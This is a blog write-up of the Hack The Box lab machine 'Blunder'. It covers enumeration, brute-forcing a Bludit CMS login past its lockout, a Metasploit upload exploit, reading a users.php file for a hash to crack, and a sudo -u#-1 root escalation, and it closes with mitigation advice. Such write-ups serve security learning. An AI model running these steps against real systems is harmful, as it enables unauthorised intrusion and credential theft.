<!DOCTYPE html><html lang="en" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><meta name="generator" content="Jekyll v4.2.2" /><meta property="og:title" content="Hack the Box - Blunder" /><meta property="og:locale" content="en" /><meta name="description" content="This is my guide to the HackTheBox Linux machine Blunder." /><meta property="og:description" content="This is my guide to the HackTheBox Linux machine Blunder." /><link rel="canonical" href="https://tid4l.github.io/posts/HTB-Blunder/" /><meta property="og:url" content="https://tid4l.github.io/posts/HTB-Blunder/" /><meta property="og:site_name" content="TidalSec" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2020-06-04T13:00:00-05:00" /><meta name="twitter:card" content="summary" /><meta property="twitter:title" content="Hack the Box - Blunder" /><meta name="twitter:site" content="@twitter_username" /> <script type="application/ld+json"> {"@context":"https://schema.org","@type":"BlogPosting","dateModified":"2020-06-04T13:00:00-05:00","datePublished":"2020-06-04T13:00:00-05:00","description":"This is my guide to the HackTheBox Linux machine Blunder.","headline":"Hack the Box - Blunder","mainEntityOfPage":{"@type":"WebPage","@id":"https://tid4l.github.io/posts/HTB-Blunder/"},"url":"https://tid4l.github.io/posts/HTB-Blunder/"}</script><title>Hack the Box - Blunder | TidalSec</title><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/site.webmanifest"><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico"><meta name="apple-mobile-web-app-title" content="TidalSec"><meta name="application-name" content="TidalSec"><meta name="msapplication-TileColor" content="#da532c"><meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.googleapis.com" ><link rel="dns-prefetch" href="https://fonts.googleapis.com" ><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin><link rel="dns-prefetch" href="https://fonts.gstatic.com" crossorigin><link rel="preconnect" href="https://fonts.googleapis.com" ><link rel="dns-prefetch" href="https://fonts.googleapis.com" ><link rel="preconnect" href="https://cdn.jsdelivr.net" ><link rel="dns-prefetch" href="https://cdn.jsdelivr.net" ><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Lato&family=Source+Sans+Pro:wght@400;600;700;900&display=swap"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/css/bootstrap.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css"><link rel="stylesheet" href="/assets/css/style.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/magnific-popup@1/dist/magnific-popup.min.css"> <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script> <script type="text/javascript"> class ModeToggle { static get MODE_KEY() { return "mode"; } static get MODE_ATTR() { return "data-mode"; } static get DARK_MODE() { return "dark"; } static get LIGHT_MODE() { return "light"; } static get ID() { return "mode-toggle"; } constructor() { if (this.hasMode) { if (this.isDarkMode) { if (!this.isSysDarkPrefer) { this.setDark(); } } else { if (this.isSysDarkPrefer) { this.setLight(); } } } let self = this; /* always follow the system prefers */ this.sysDarkPrefers.addEventListener("change", () => { if (self.hasMode) { if (self.isDarkMode) { if (!self.isSysDarkPrefer) { self.setDark(); } } else { if (self.isSysDarkPrefer) { self.setLight(); } } self.clearMode(); } self.notify(); }); } /* constructor() */ get sysDarkPrefers() { return window.matchMedia("(prefers-color-scheme: dark)"); } get isSysDarkPrefer() { return this.sysDarkPrefers.matches; } get isDarkMode() { return this.mode === ModeToggle.DARK_MODE; } get isLightMode() { return this.mode === ModeToggle.LIGHT_MODE; } get hasMode() { return this.mode != null; } get mode() { return sessionStorage.getItem(ModeToggle.MODE_KEY); } /* get the current mode on screen */ get modeStatus() { if (this.isDarkMode || (!this.hasMode && this.isSysDarkPrefer)) { return ModeToggle.DARK_MODE; } else { return ModeToggle.LIGHT_MODE; } } setDark() { $('html').attr(ModeToggle.MODE_ATTR, ModeToggle.DARK_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE); } setLight() { $('html').attr(ModeToggle.MODE_ATTR, ModeToggle.LIGHT_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE); } clearMode() { $('html').removeAttr(ModeToggle.MODE_ATTR); sessionStorage.removeItem(ModeToggle.MODE_KEY); } /* Notify another plugins that the theme mode has changed */ notify() { window.postMessage({ direction: ModeToggle.ID, message: this.modeStatus }, "*"); } } /* ModeToggle */ const toggle = new ModeToggle(); function flipMode() { if (toggle.hasMode) { if (toggle.isSysDarkPrefer) { if (toggle.isLightMode) { toggle.clearMode(); } else { toggle.setLight(); } } else { if (toggle.isDarkMode) { toggle.clearMode(); } else { toggle.setDark(); } } } else { if (toggle.isSysDarkPrefer) { toggle.setLight(); } else { toggle.setDark(); } } toggle.notify(); } /* flipMode() */ </script><body data-spy="scroll" data-target="#toc" data-topbar-visible="true"><div id="sidebar" class="d-flex flex-column align-items-end"><div class="profile-wrapper text-center"><div id="avatar"> <a href="/" alt="avatar" class="mx-auto"> <img src=" /assets/img/avi/avi.jpg " alt="avatar" onerror="this.style.display='none'"> </a></div><div class="site-title mt-3"> <a href="/">TidalSec</a></div><div class="site-subtitle font-italic">Cybersecurity.</div></div><ul class="w-100"><li class="nav-item"> <a href="/" class="nav-link"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>HOME</span> </a><li class="nav-item"> <a href="/categories/" class="nav-link"> <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i> <span>CATEGORIES</span> </a><li class="nav-item"> <a href="/tags/" class="nav-link"> <i class="fa-fw fas fa-tag ml-xl-3 mr-xl-3 unloaded"></i> <span>TAGS</span> </a><li class="nav-item"> <a href="/archives/" class="nav-link"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>ARCHIVES</span> </a><li class="nav-item"> <a href="/about/" class="nav-link"> <i class="fa-fw fas fa-info-circle ml-xl-3 mr-xl-3 unloaded"></i> <span>ABOUT</span> </a></ul><div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center align-items-center"> <button class="mode-toggle btn" aria-label="Switch Mode"> <i class="fas fa-adjust"></i> </button> <span class="icon-border"></span> <a href="https://github.com/tid4l" aria-label="github" target="_blank" rel="noopener"> <i class="fab fa-github"></i> </a> <a href="https://twitter.com/twitter_username" aria-label="twitter" target="_blank" rel="noopener"> <i class="fab fa-twitter"></i> </a> <a href=" javascript:location.href = 'mailto:' + ['example','doamin.com'].join('@')" aria-label="email" > <i class="fas fa-envelope"></i> </a> <a href="/feed.xml" aria-label="rss" > <i class="fas fa-rss"></i> </a></div></div><div id="topbar-wrapper" class="row justify-content-center"><div id="topbar" class="col-11 d-flex h-100 align-items-center justify-content-between"> <span id="breadcrumb"> <span> <a href="/"> Home </a> </span> <span>Hack the Box - Blunder</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" autocomplete="off" placeholder="Search..."> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper"><div id="main"><div class="row"><div id="core-wrapper" class="col-12 col-lg-11 col-xl-8"><div class="post pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><h1 data-toc-skip>Hack the Box - Blunder</h1><div class="post-meta text-muted"><div> By <em> <a href="https://twitter.com/username">Chris</a> </em></div><div class="d-flex"><div> <span> Posted <em class="timeago" data-ts="1591293600" data-toggle="tooltip" data-placement="bottom" data-tooltip-df="llll" > 2020-06-04 </em> </span> <span class="readtime" data-toggle="tooltip" data-placement="bottom" title="1180 words"> <em>6 min</em> read</span></div></div></div><div class="post-content"><p>This is my guide to the HackTheBox Linux machine <em>Blunder</em>.</p><hr /><blockquote class="prompt-warning"><div><p>These HTB writeups have been migrated from a standalone repository for ease of access. However, I wrote these to learn and can’t attest to the accuracy of my thoughts.</p></div></blockquote><p><img data-src="/assets/img/posts/htb/06-2020/info.PNG" alt="" data-proofer-ignore> <em>Task: Find <a href="#user-flag">user.txt</a> and <a href="#root-flag">root.txt</a></em></p><h2 id="penetration-methodologies"><span class="mr-2">Penetration Methodologies</span><a href="#penetration-methodologies" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><p><strong>Scanning</strong></p><ul><li>nmap</ul><p><strong>Enumeration</strong></p><ul><li><p>Webpage enumeration</p><li><p>CMS login brute force</p></ul><p><strong>Exploitation</strong></p><ul><li>CMS directory traversal attack</ul><p><strong>Priv Esc</strong></p><ul><li>Sudo security bypass</ul><h2 id="user-flag"><span class="mr-2">User Flag</span><a href="#user-flag" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><p>First, let’s scan <em>Blunder</em> with <code class="language-plaintext highlighter-rouge">nmap</code>.</p><ul><li><p><strong>sC</strong>: Enable common scripts</p><li><p><strong>sV</strong>: version and service on the port</p><li><p><strong>O</strong>: remote OS detection using fingerprinting</p></ul><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
</pre><td class="rouge-code"><pre><span class="c"># Nmap 7.80 scan initiated Tue Jun  2 16:50:18 2020 as: nmap -sC -sV -O -oA scan191 10.10.10.191</span>
Nmap scan report <span class="k">for </span>10.10.10.191
Host is up <span class="o">(</span>0.21s latency<span class="o">)</span><span class="nb">.</span>
Not shown: 998 filtered ports
PORT   STATE  SERVICE VERSION
21/tcp closed ftp
80/tcp open   http    Apache httpd 2.4.41 <span class="o">((</span>Ubuntu<span class="o">))</span>
|_http-generator: Blunder
|_http-server-header: Apache/2.4.41 <span class="o">(</span>Ubuntu<span class="o">)</span>
|_http-title: Blunder | A blunder of interesting facts
Aggressive OS guesses: HP P2000 G3 NAS device <span class="o">(</span>91%<span class="o">)</span>, Linux 2.6.26 - 2.6.35 <span class="o">(</span>89%<span class="o">)</span>, OpenWrt Kamikaze 7.09 <span class="o">(</span>Linux 2.6.22<span class="o">)</span> <span class="o">(</span>89%<span class="o">)</span>, Linux 3.16 - 4.6 <span class="o">(</span>89%<span class="o">)</span>, Linux 2.6.32 - 3.13 <span class="o">(</span>88%<span class="o">)</span>, Linux 3.3 <span class="o">(</span>88%<span class="o">)</span>, Linux 2.6.23 - 2.6.38 <span class="o">(</span>88%<span class="o">)</span>, Linux 2.6.31 - 2.6.32 <span class="o">(</span>88%<span class="o">)</span>, Linux 2.6.32 <span class="o">(</span>88%<span class="o">)</span>, Linux 2.6.32 - 2.6.39 <span class="o">(</span>88%<span class="o">)</span>
No exact OS matches <span class="k">for </span>host <span class="o">(</span><span class="nb">test </span>conditions non-ideal<span class="o">)</span><span class="nb">.</span>

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ <span class="nb">.</span>
<span class="c"># Nmap done at Tue Jun  2 16:52:39 2020 -- 1 IP address (1 host up) scanned in 141.22 seconds</span>
</pre></table></code></div></div><p>Two standard ports are open, 21, indicating FTP, and 80, which indicates a webpage.</p><p>Additionally, doing a full port scan reveals no new ports. Let’s go ahead and enumerate webpages with <code class="language-plaintext highlighter-rouge">gobuster</code>.</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="nv">$ </span>gobuster <span class="nb">dir</span> <span class="nt">-u</span> http://10.10.10.191 <span class="nt">-w</span> /usr/share/wordlists/dirb/common.txt <span class="nt">-x</span> .htm,.html,.php,.txt
</pre></table></code></div></div><p>Our scan reveals an admin page at <code class="language-plaintext highlighter-rouge">http://10.10.10.191/admin/</code>. This is most likely a CMS for the website, let’s check it out.</p><p><img data-src="/assets/img/posts/htb/06-2020/bludit-login.png" alt="" data-proofer-ignore></p><p>We find a login page for the <a href="https://www.bludit.com/">Bludit CMS</a>. Unfortunately we don’t have much to go off at the moment and a quick search reveals that there aren’t any unauthenticated vulnerabilities for it.</p><p>We also find a todo file at <code class="language-plaintext highlighter-rouge">http://10.10.10.191/todo.txt</code>, which contains the fergus username, amongst other information. This username, however, fails to authenticate with some common passwords, and too many failed attempts actually locks us out, preventing further attempts.</p><p>Let’s navigate to the main website and see what useful information we can find.</p><p><img data-src="/assets/img/posts/htb/06-2020/roland.png" alt="" data-proofer-ignore></p><p>The various webpages don’t reveal any useful information, so let’s just grab as many interesting words and names as we find and create a wordlist called <code class="language-plaintext highlighter-rouge">wordlist.txt</code> to attempt a brute force login with.</p><p>Since the Bludit CMS locks us out when we try a brute force, our earlier research indicates that a <a href="https://rastating.github.io/bludit-brute-force-mitigation-bypass/">proof-of-concept exploit</a> exists to by pass the lockout. Let’s give it a shot.</p><p>First, we must edit the variables in the POC. Since the todo file mentions a fergus user, we’ll try to brute force that account first.</p><div class="language-python highlighter-rouge"><div class="code-header"> <span data-label-text="Python"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre><td class="rouge-code"><pre><span class="n">host</span> <span class="o">=</span> <span class="s">'http://10.10.10.191'</span>
<span class="n">login_url</span> <span class="o">=</span> <span class="n">host</span> <span class="o">+</span> <span class="s">'/admin/login'</span>
<span class="n">username</span> <span class="o">=</span> <span class="s">'fergus'</span>
<span class="n">fname</span> <span class="o">=</span> <span class="s">'wordlist.txt'</span>
</pre></table></code></div></div><p>Let’s run the POC and see if any words from the website were also used as a password, for some reason.</p><p><img data-src="/assets/img/posts/htb/06-2020/poc.png" alt="" data-proofer-ignore></p><p>Quickly, our POC returns valid credentials. RolandDeschain, an interesting typo in the passage above, happens to be the password for the user fergus.</p><p>Let’s log in and check out the Bludit CMS.</p><p><img data-src="/assets/img/posts/htb/06-2020/bludit-admin.png" alt="" data-proofer-ignore></p><p>Success. Poking around doesn’t reveal anything in and of itself, but our previous research showed that authenticated vulnerabilities exist for older versions of Bludit. Back on our dashboard, the version is displayed. In this particular scenario, the version is 3.9.2, which is vulnerable to a <a href="https://www.exploit-db.com/exploits/47699">directory traversal attack</a>.</p><p>We’ll use the exploit provided on Metasploit.</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="nv">$ </span><span class="nb">sudo </span>msfdb run
</pre></table></code></div></div><p>Once Metasploit is loaded, let’s use the “bludit_upload_images_exec” exploit, set our variables, using our previously discovered valid credentials.</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre><td class="rouge-code"><pre>msf5 <span class="o">&gt;</span> use exploit/linux/http/bludit_upload_images_exec
msf5 <span class="o">&gt;</span> <span class="nb">set </span>BLUDITPASS RolandDeschain
msf5 <span class="o">&gt;</span> <span class="nb">set </span>BLUDITUSER fergus
msf5 <span class="o">&gt;</span> <span class="nb">set </span>TARGETURI /
</pre></table></code></div></div><p>Now, let’s run the exploit.</p><p><img data-src="/assets/img/posts/htb/06-2020/metasploit.png" alt="" data-proofer-ignore></p><p>Success, we now have remote access to the box. Let’s spawn a shell with Meterpreter, then upgrade it.</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre>meterpeter <span class="o">&gt;</span> shell
<span class="nv">$ </span>python3 <span class="nt">-c</span> <span class="s1">'import pty;pty.spawn("/bin/bash");
</span></pre></table></code></div></div><p>It doesn’t look like we have access to the first flag yet, but looking around, there appears to be a database file within the <code class="language-plaintext highlighter-rouge">bludit-3.10.0a</code> directory. Using <code class="language-plaintext highlighter-rouge">cat</code> to display the contents of <code class="language-plaintext highlighter-rouge">users.php</code>, we reveal the user hugo and a hashed password.</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
</pre><td class="rouge-code"><pre><span class="nv">$ </span><span class="nb">cd</span> /var/www/bludit-3.10.0a/bl-content/databases
<span class="nv">$ </span><span class="nb">cat </span>users.php
&lt;?php defined<span class="o">(</span><span class="s1">'BLUDIT'</span><span class="o">)</span> or die<span class="o">(</span><span class="s1">'Bludit CMS.'</span><span class="o">)</span><span class="p">;</span> ?&gt;
<span class="o">{</span>
    <span class="s2">"admin"</span>: <span class="o">{</span>
        <span class="s2">"nickname"</span>: <span class="s2">"Hugo"</span>,
        <span class="s2">"firstName"</span>: <span class="s2">"Hugo"</span>,
        <span class="s2">"lastName"</span>: <span class="s2">""</span>,
        <span class="s2">"role"</span>: <span class="s2">"User"</span>,
        <span class="s2">"password"</span>: <span class="s2">"faca404fd5c0a31cf1897b823c695c85cffeb98d"</span>,
        <span class="s2">"email"</span>: <span class="s2">""</span>,
        <span class="s2">"registered"</span>: <span class="s2">"2019-11-27 07:40:55"</span>,
        <span class="s2">"tokenRemember"</span>: <span class="s2">""</span>,
        <span class="s2">"tokenAuth"</span>: <span class="s2">"b380cb62057e9da47afce66b4615107d"</span>,
        <span class="s2">"tokenAuthTTL"</span>: <span class="s2">"2009-03-15 14:00"</span>,
        <span class="s2">"twitter"</span>: <span class="s2">""</span>,
        <span class="s2">"facebook"</span>: <span class="s2">""</span>,
        <span class="s2">"instagram"</span>: <span class="s2">""</span>,
        <span class="s2">"codepen"</span>: <span class="s2">""</span>,
        <span class="s2">"linkedin"</span>: <span class="s2">""</span>,
        <span class="s2">"github"</span>: <span class="s2">""</span>,
        <span class="s2">"gitlab"</span>: <span class="s2">""</span><span class="o">}</span>
<span class="o">}</span>
</pre></table></code></div></div><p>Let’s crack this password hash.</p><p><img data-src="/assets/img/posts/htb/06-2020/cracked.png" alt="" data-proofer-ignore></p><p>Back in our shell, we may now be able to change users to hugo, if they’ve reused passwords.</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre><span class="nv">$ </span>su hugo
Password: Password120
</pre></table></code></div></div><p>It worked. Now that we’re hugo, let’s grab the user flag.</p><p><img data-src="/assets/img/posts/htb/06-2020/user-flag.png" alt="" data-proofer-ignore></p><h2 id="root-flag"><span class="mr-2">Root Flag</span><a href="#root-flag" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><p>Alright, let’s see what privileges hugo has, maybe we can elevate our privileges. We’ll run <code class="language-plaintext highlighter-rouge">sudo -l</code> first to see what special commands can be ran.</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre><td class="rouge-code"><pre><span class="nv">$ </span><span class="nb">sudo</span> <span class="nt">-l</span>
<span class="o">[</span>...]
User hugo may run the following commands on blunder:
    <span class="o">(</span>ALL, <span class="o">!</span>root<span class="o">)</span> /bin/bash
</pre></table></code></div></div><p>It looks like our user can run the binary <code class="language-plaintext highlighter-rouge">/bin/bash</code> as any user. By running a single command, we can open a shell as root. This exploit is better explained on <a href="https://www.exploit-db.com/exploits/47502">Exploit DB</a>.</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="nv">$ </span><span class="nb">sudo</span> <span class="nt">-u</span><span class="c">#-1 /bin/bash</span>
</pre></table></code></div></div><p>We’ve elevated to root! Let’s grab the last flag.</p><p><img data-src="/assets/img/posts/htb/06-2020/root-flag.png" alt="" data-proofer-ignore></p><hr /><h2 id="mitigation"><span class="mr-2">Mitigation</span><a href="#mitigation" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><ul><li><p>Avoid having a CMS public-facing, unless absolutely necessary. If so, it should be updated regularly. Like this scenario showed, two vulnerabilities can be strung together to get remote code execution. Additionally, if the CMS is public facing, passwords should not only be complex, but also not in plain text on the website.</p><li><p>Careful consideration should be taken when changing the defaults for a user’s privileges. Whether it’s the exploit used in this scenario, or something available on <a href="https://gtfobins.github.io/">GTFOBins</a>, a lot of routes become available for privilege escalation when privileges are modified or commands are altered to allow execution at a higher integrity.</p></ul><h2 id="final-thoughts"><span class="mr-2">Final Thoughts</span><a href="#final-thoughts" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><p>This was an interesting box. The password discovery was a bit weird. It seems that the idea was that the user was typing an entry to his website and typed the name “Roland Deschain” like his password, out of habit. Not really something I understood until I was able to build out a wordlist and brute force the CMS. I liked how SSH was not available, so shell access needed to be achieved through remote code execution vulnerabilities. Additionally, I don’t typically like to use Metasploit in these CTFs but I had a hard time building out an exploit for the directory traversal attack and RCE, so I just spent some extra time learning how the Metasploit module worked.</p></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='/categories/hack-the-box/'>Hack the Box</a>, <a href='/categories/linux/'>Linux</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/linux/" class="post-tag no-text-decoration" >linux</a> <a href="/tags/ctf/" class="post-tag no-text-decoration" >ctf</a> <a href="/tags/htb/" class="post-tag no-text-decoration" >htb</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/"> CC BY 4.0 </a> by the author.</div><div class="share-wrapper"> <span class="share-label text-muted mr-1">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=Hack the Box - Blunder - TidalSec&amp;url=https://tid4l.github.io/posts/HTB-Blunder/" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank" rel="noopener" aria-label="Twitter"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=Hack the Box - Blunder - TidalSec&amp;u=https://tid4l.github.io/posts/HTB-Blunder/" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank" rel="noopener" aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://t.me/share/url?url=https://tid4l.github.io/posts/HTB-Blunder/&amp;text=Hack the Box - Blunder - TidalSec" data-toggle="tooltip" data-placement="top" title="Telegram" target="_blank" rel="noopener" aria-label="Telegram"> <i class="fa-fw fab fa-telegram"></i> </a> <i id="copy-link" class="fa-fw fas fa-link small" data-toggle="tooltip" data-placement="top" title="Copy link" data-title-succeed="Link copied successfully!"> </i> </span></div></div></div></div></div><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted"><div class="access"><div id="access-lastmod" class="post"><div class="panel-heading">Recently Updated</div><ul class="post-content pl-0 pb-1 ml-1 mt-2"><li><a href="/posts/First-Post-and-Obligatory-Blog-Walkthrough/">First Post and Obligatory Blog Walkthrough</a></ul></div><div id="access-tags"><div class="panel-heading">Trending Tags</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/ctf/">ctf</a> <a class="post-tag" href="/tags/htb/">htb</a> <a class="post-tag" href="/tags/windows/">windows</a> <a class="post-tag" href="/tags/linux/">linux</a> <a class="post-tag" href="/tags/walkthrough/">walkthrough</a> <a class="post-tag" href="/tags/active-directory/">active directory</a> <a class="post-tag" href="/tags/blog/">blog</a> <a class="post-tag" href="/tags/c/">c</a> <a class="post-tag" href="/tags/discovery/">discovery</a> <a class="post-tag" href="/tags/edr/">edr</a></div></div></div><script src="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.js"></script><div id="toc-wrapper" class="pl-0 pr-4 mb-5"><div class="panel-heading pl-3 pt-2 mb-2">Contents</div><nav id="toc" data-toggle="toc"></nav></div></div></div><div class="row"><div class="col-12 col-lg-11 col-xl-8"><div id="tail-wrapper" class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><div id="related-posts" class="mt-5 mb-2 mb-sm-4"><h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>Further Reading</h3><div class="card-deck mb-4"><div class="card"> <a href="/posts/HTB-Tabby/"><div class="card-body"> <em class="timeago small" data-ts="1593626400" > 2020-07-01 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Hack the Box - Tabby</h3><div class="text-muted small"><p> This is my write up for the HackTheBox Linux machine Tabby. These HTB writeups have been migrated from a standalone repository for ease of access. However, I wrote these to learn and can’t at...</p></div></div></a></div><div class="card"> <a href="/posts/HTB-Cache/"><div class="card-body"> <em class="timeago small" data-ts="1593885600" > 2020-07-04 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Hack the Box - Cache</h3><div class="text-muted small"><p> This is my guide to the HackTheBox Linux machine Cache. These HTB writeups have been migrated from a standalone repository for ease of access. However, I wrote these to learn and can’t attest...</p></div></div></a></div><div class="card"> <a href="/posts/HTB-OpenAdmin/"><div class="card-body"> <em class="timeago small" data-ts="1585332000" > 2020-03-27 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Hack The Box - OpenAdmin</h3><div class="text-muted small"><p> This write-up is an attempt to show my process of achieving root in the HackTheBox machine OpenAdmin. These HTB writeups have been migrated from a standalone repository for ease of access. Ho...</p></div></div></a></div></div></div><div class="post-navigation d-flex justify-content-between"> <a href="/posts/HTB-Monteverde/" class="btn btn-outline-primary" prompt="Older"><p>Hack the Box - Monteverde</p></a> <a href="/posts/HTB-Sauna/" class="btn btn-outline-primary" prompt="Newer"><p>Hack the Box - Sauna</p></a></div></div></div></div><footer class="d-flex w-100 justify-content-center"><div class="d-flex justify-content-between align-items-center text-muted"><div class="footer-left"><p class="mb-0"> © 2022 <a href="https://twitter.com/username">Chris</a>. <span data-toggle="tooltip" data-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">Some rights reserved.</span></p></div><div class="footer-right"><p class="mb-0"> Powered by <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a> with <a href="https://github.com/cotes2020/jekyll-theme-chirpy" target="_blank" rel="noopener">Chirpy</a> theme.</p></div></div></footer></div><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-sm-11 post-content"><div id="search-hints"><div id="access-tags"><div class="panel-heading">Trending Tags</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/ctf/">ctf</a> <a class="post-tag" href="/tags/htb/">htb</a> <a class="post-tag" href="/tags/windows/">windows</a> <a class="post-tag" href="/tags/linux/">linux</a> <a class="post-tag" href="/tags/walkthrough/">walkthrough</a> <a class="post-tag" href="/tags/active-directory/">active directory</a> <a class="post-tag" href="/tags/blog/">blog</a> <a class="post-tag" href="/tags/c/">c</a> <a class="post-tag" href="/tags/discovery/">discovery</a> <a class="post-tag" href="/tags/edr/">edr</a></div></div></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><div id="mask"></div><a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a> <script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.10.0/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 